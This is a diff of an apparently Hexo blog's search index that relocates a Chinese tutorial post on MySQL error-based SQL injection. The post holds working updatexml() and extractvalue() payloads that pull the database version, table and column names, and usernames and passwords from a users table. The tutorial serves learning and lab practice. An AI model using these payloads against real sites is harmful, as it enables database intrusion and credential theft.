+<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
+]]></content>
+      <categories>
+        <category>《WEB安全基础》</category>
+        <category>防护识别</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>防护识别</tag>
       </tags>
   </entry>
   <entry>
@@ -17230,6 +17230,33 @@
       </tags>
   </entry>
   <entry>
+    <title>sql注入之报错注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入之联合注入</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
@@ -17272,33 +17299,6 @@
       </categories>
       <tags>
         <tag>联合注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入之报错注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
-<blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>报错注入</tag>
       </tags>
   </entry>
   <entry>
